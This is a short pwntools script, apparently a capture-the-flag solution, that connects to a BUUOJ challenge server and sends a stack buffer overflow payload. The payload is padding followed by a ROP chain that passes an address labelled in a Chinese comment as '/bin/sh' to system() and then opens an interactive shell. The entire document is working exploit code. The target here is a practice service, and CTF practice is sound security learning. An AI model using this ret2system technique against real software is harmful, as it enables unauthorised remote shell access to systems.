from pwn import *
p = remote('node4.buuoj.cn' ,28881)
p.sendline(b'a' * 0x10 + b'A' * 8 + p64(0x400683) + p64(0x601048) + p64(0x400490))
# /bin/sh + ret返回 + system（command） 将/bin/sh作为实参传入
p.interactive()
